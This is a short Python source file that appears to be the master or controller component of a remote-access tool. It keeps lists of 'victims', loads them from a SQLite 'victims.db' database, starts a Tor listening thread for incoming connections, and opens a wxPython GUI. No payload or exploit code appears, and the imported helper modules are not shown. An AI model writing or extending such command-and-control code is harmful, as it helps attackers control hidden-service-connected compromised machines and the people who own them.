online_victims = []
victim_names = []

selected_victim = []

def Master():
    import sqlite3, torConnection, threading,gui

    dbConnection = sqlite3.connect("victims.db")
    dbCursor = dbConnection.cursor()

    hearingLoopThread = threading.Thread(target= torConnection.hearingLoop).start()

    dbCursor.execute("SELECT * FROM victims")
    victims_data = dbCursor.fetchall()
    
    for victim in victims_data:
        victim_names.append(victim[0])

    ui = gui.wx.App()
    frame = gui.MainFrame(None)
    frame.Show()
    ui.MainLoop()

    




